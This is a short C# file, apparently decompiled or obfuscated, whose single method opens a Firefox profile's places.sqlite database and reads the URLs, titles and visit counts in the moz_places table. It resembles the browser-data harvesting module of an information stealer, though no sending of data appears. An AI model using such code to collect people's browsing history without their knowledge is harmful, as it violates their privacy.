using System;
using System.Collections.Generic;
using System.IO;

internal class Class75
{
	public static List<Struct3> smethod_0(string string_0)
	{
		List<Struct3> list = new List<Struct3>();
		string text = Class53.smethod_2(string_0);
		if (text == null)
		{
			return list;
		}
		Class54 @class = Class54.smethod_1(Path.Combine(text, "places.sqlite"), "moz_places");
		if (@class == null)
		{
			return list;
		}
		for (int i = 0; i < @class.method_1(); i++)
		{
			Struct3 item = default(Struct3);
			item.String_0 = GClass13.smethod_4(@class.method_0(i, 1));
			item.String_1 = GClass13.smethod_4(@class.method_0(i, 2));
			item.Int32_0 = Convert.ToInt32(@class.method_0(i, 4)) + 1;
			if (item.String_1 != "0")
			{
				list.Add(item);
			}
		}
		return list;
	}
}
